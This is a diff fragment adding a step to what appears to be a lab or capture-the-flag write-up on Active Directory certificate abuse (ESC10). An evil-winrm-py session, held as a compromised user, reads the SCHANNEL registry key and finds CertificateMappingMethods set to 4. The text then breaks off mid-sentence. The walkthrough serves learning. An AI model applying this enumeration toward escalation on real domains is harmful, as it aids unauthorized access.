@@ -812,7 +812,29 @@ After some research i find ESC10 involved having write access over a user UPN
 
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication
 
+```python
+evil-winrm-py PS C:\Users\nathan.aadam\Documents> $Path = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"
 
+
+evil-winrm-py PS C:\Users\nathan.aadam\Documents> Get-ItemProperty -Path $Path
+
+
+EventLogging              : 1
+CertificateMappingMethods : 4
+PSPath                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Secu
+                            rityProviders\SCHANNEL
+PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Secu
+                            rityProviders
+PSChildName               : SCHANNEL
+PSDrive                   : HKLM
+PSProvider                : Microsoft.PowerShell.Core\Registry
+
+
+
+evil-winrm-py PS C:\Users\nathan.aadam\Documents>
+```
+
+As seen here the value `CertificateMappingMethods` is set to 4, this means 
 
 
 
